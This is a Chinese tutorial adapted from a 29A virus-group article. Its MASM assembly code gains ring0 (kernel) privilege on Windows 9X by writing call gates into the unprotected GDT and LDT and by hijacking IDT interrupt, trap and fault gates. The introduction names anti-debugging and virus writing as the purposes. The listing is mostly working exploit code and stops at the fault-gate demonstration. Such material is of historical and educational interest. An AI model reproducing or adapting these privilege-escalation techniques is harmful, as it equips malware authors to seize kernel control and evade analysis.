
# Ring0 权限的取得

> 原文：[`www.pediy.com/kssd/pediy04/kanxue427.htm`](https://www.pediy.com/kssd/pediy04/kanxue427.htm)

`comment $/\*`

Ring0 权限的取得(part1:9X)

翻译改写: Hume/冷雨飘心

原文作者: Super/29A

`windows` 运行在保护模式,保护模式将指令执行分为 3 个特权级,即众所周知的 `ring0` ~`ring3`,`ring0` 意味着更多的权利,可以直接执行诸如访问端口等操作,通常一般应用程序运行于 `ring3`,这没有什么不好,很好的限制了那些刚弄懂 `Turbo C` 的小孩搞破坏,然而当我们需要 `ring0` 的时候,比如跟踪,反跟踪,写病毒?麻烦就来了.进入 `ring0` 一般要写 `VxD` 或 `WDM` 驱动,然而,这对一般人来说并不那么简单,其实由于 `9X` 未对 `IDT`,`GDT`,`LDT` 加以保护,可以利用这一点漏洞来进入 `ring0`,这是一点入门介绍,其实,`ring0` 也不难,下面就是根据 `Super/29A` 的文章用 `Masm` 改写的例子,改进了一点并加了点注释,希望对你能有所启发.

以前曾写过用 `SEH` 进入 `ring0` 的例子.利用 `seh` 进入 `ring0` 是比较简单的.下面假设你对保护模式有所了解,如果遇到不懂的地方,赶紧翻翻保护模式教程.

`NT/2K/Xp` 下 `ring0` 的取得是一个较困难的课题.关于 `2k` 下,`webcrazy` 写了一篇 `C` 教程,有时间用 `ASM` 改写一下.

虽然 `9X` 肯定会被淘汰,但对 `ring0` 的不懈追求将是一个永恒的主题.

`\*/$`

```.586p

.model flat, stdcall

option casemap :none ; case sensitive

include hd.h

include mac.h

;;--------------

  .DATA
sztit  db "By Hume,2002",0

Freq   db 08h       ;发声频率

gdtR   df 0

idtR   df 0

ldtR   dw 0         ;the contents of GDTR,IDTR,LDTR

ldtDes dw 0         ;LDT Limit
         dw 0
         dd 0       ;LDT Base

Callgt dq 0         ;call gate's sel:off

;;-----------------------------------------

  .CODE
__Start:

    sgdt   fword ptr gdtR
     sidt   fword ptr idtR
     sldt   word ptr  ldtR      ;save them for later use
     ;-----------------------
     ; get the ldt mes
     ;-----------------------
     movzx  esi,ldtR
     add    esi,dword ptr [gdtR+2]
     mov    ax,word  ptr [esi]
     mov    word  ptr [ldtDes],ax
     mov    ax,word  ptr [esi+6]
     and    ax,0fh
     mov    word  ptr [ldtDes+2],ax       ;get ldt Limit
     mov    eax,[esi+2]
     and    eax,0ffffffh
     mov    ebx,[esi+4]
     and    ebx,0ff000000h
     add    eax,ebx
     mov    dword ptr [ldtDes+4],eax       ;get ldt Base
     ;-------------------------------------
     ; 这里演示在 GDT 中寻找空白表项来制造调用门
     ;-------------------------------------
     mov    esi,dword ptr [gdtR+2]
     movzx  eax,word  ptr [gdtR]
     call   Search_XDT
                                            ;esi==gdt Base
     mov    esi,dword ptr [gdtR+2]
     push   offset myring0_prc_callgt
     pop    word  ptr [esi+eax+0]
     pop    word  ptr [esi+eax+6]      ;Offset
     mov    word  ptr [esi+eax+2],28h
     mov    word  ptr [esi+eax+4],0EC00h ;sel=28h and attribute ->386 call gate!
     and    dword ptr Callgt,0
     mov    word  ptr [Callgt+4],ax
     call   fword ptr [Callgt]           ;Ring0!
     ;--------------------------------------------
     ; 这里演示在 Ldt 中制造调用门
     ;--------------------------------------------
     invoke   MessageBox,0,CTEXT("Call gate to Ring0!继续?"),addr sztit,MB_YESNO
     cmp    eax,IDNO
     jz     @xit000                     ;继续演示?
     mov    esi,dword ptr [ldtDes+4]
     mov    eax,dword ptr [ldtDes]
     call   Search_XDT                  ;eax 返回找到的空白选择子
     mov    esi,dword ptr [ldtDes+4]
     push   offset myring0_prc_callgt
     pop    word  ptr [esi+eax+0]
     pop    word  ptr [esi+eax+6]      ;Offset
     mov    word  ptr [esi+eax+2],28h
     mov    word  ptr [esi+eax+4],0EC00h ;sel=28h and attribute ->386 call gate!
     and    dword ptr Callgt,0
     or     al,7h                       ;所以选择子一定要指向 LDT
     mov    word  ptr [Callgt+4],ax
     call   fword ptr [Callgt]           ;Ring0!

; *通过中断门进入 ring0,像在 Dos 下一样,我们只要替换中断向量表的地址以指向我们
; *自己的程序就可以了,不过在 win 下中断向量表变为 IDT(中断描述符表),其第 0~1 保存
; *中断处理程序偏移的低 16 位,6~7 字节保存偏移的高 16 位,我们必须使描述符具有 DPL=3
; *以便在 ring3 下转入中断程序,而 int 01h,03h,04h,05h,30h 本来就是 DPL=3,我们可
; *以方便地利用之,注意中断处理程序返回用 iret

     ;---------------------------
     ; 下面利用 int 5 进入 ring0
     ;---------------------------
     invoke   MessageBox,0,CTEXT("Int gate to Ring0 By Int 5 !继续?"),addr sztit,MB_YESNO
     cmp    eax,IDNO
     jz     @xit000                     ;继续演示?
     mov    esi,dword ptr [idtR+2]
     push   dword ptr [esi+8*5]
     push   dword ptr [esi+8*5+4]      ;保存中断描述符
     push   offset myring0_prc_Intgt
     pop    word  ptr [esi+8*5]
     pop    word  ptr [esi+8*5+6]
     int    5                          ;进入 ring0!
     ;int    3                          ;//可选择利用 int 3
     ;db    0CCh                        ;//则保存和恢复就改为 8*3
     ;为了增强反跟踪效果
     ;当然也可以利用 int 1,方法一致不过可能在某些处理器上冲突
     pop    dword ptr [esi+8*5+4]      ;恢复
     pop    dword ptr [esi+8*5+0]

; *当然,上面使用的全部是 DPL=3 的 int 如 1,3,5 等,如果我们准备使用任意 int 来达到
; *目的该怎么办?这就需要自己改 int descriptor 的属性值,使 DPL=3,sel=28h
; *如下面使用 int 255
; *______________________________________________
     invoke   MessageBox,0,CTEXT("Int gate to Ring0 By Int X !继续?"),addr sztit,MB_YESNO
     cmp    eax,IDNO
     jz     @xit000                     ;继续演示?
     movzx ebx,word ptr [idtR]  ;会是什么?没有关系
     sub ebx,7
     push dword ptr [esi+ebx+0] ; save IDT entry
     push dword ptr [esi+ebx+4]
     push offset myring0_prc_Intgt
     pop word ptr [esi+ebx+0]
     mov word ptr [esi+ebx+2],28h      ;ring0 Sel
     mov word ptr [esi+ebx+4],0EE00h  ;386 中断门,DPL=3
     pop word ptr [esi+ebx+6]
     mov eax,ebx
     shl eax,5
     add eax,90C300CDh
     push eax
     call esp                  ; 在堆栈中形成指令 int 5Fh ret 直接转入执行!
     pop eax                   ; int 调用,酷吧!
     pop dword ptr [esi+ebx+4]; 恢复
     pop dword ptr [esi+ebx+0]

; *
; *还有其他的方法进入 ring0,如陷阱门,与中断门基本一致,只不过是让硬件自己产生中断
; *我们则自己置 TF=1 引发之,注意在中断处理中关闭 TF,否则会造成死不断单步,还有故障门,
; *产生故障之后注意 cs:eip 已经压入堆栈,如果不改指令的话,就得自己修改 eip 指向安全地址
; *故障门的好处在于不必自己置 sel 为 28h,也不必担心 DPL=0,操作系统为我们准备好了一切
; *我们只要替换 int 处理地址就行了,以下是简单例子
; *______________________________________________
     invoke   MessageBox,0,CTEXT("Trap gate to Ring0 By Int 1!继续?"),addr sztit,MB_YESNO
     cmp    eax,IDNO
     jz     @xit000                     ;继续演示?
     ;---------------------------------
     ; int1 单步陷阱或者 int4 除法溢出陷阱
     ; 这里演示 int 1,int 4 类似
     ; 这个和上面的有不同吗,有!就是 int 1
     ; 是由 CPU 而不是我们显式用 int 1 指令引发
     ;---------------------------------
     push dword ptr [esi+(8*1)+0]      ; 保存原 int 1
     push dword ptr [esi+(8*1)+4]
     push offset myring0_prc_Trapgt
     pop word ptr [esi+(8*1)+0]
     pop word ptr [esi+(8*1)+6]
     pushfd
     pop eax
     or ah,1
     push eax
     popfd          ; TF=1
     nop            ; ring0!
     pop dword ptr [esi+(8*1)+4]; restore IDT entry
     pop dword ptr [esi+(8*1)+0]
     ;--------------------------------------------
     ; 这里演示故障门,除法错误
     ;--------------------------------------------
     invoke   MessageBox,0,CTEXT("Fault gate to Ring0!继续?"),addr sztit,MB_YESNO
     cmp    eax,IDNO
     jz     @xit000                     ;继续演示?
```
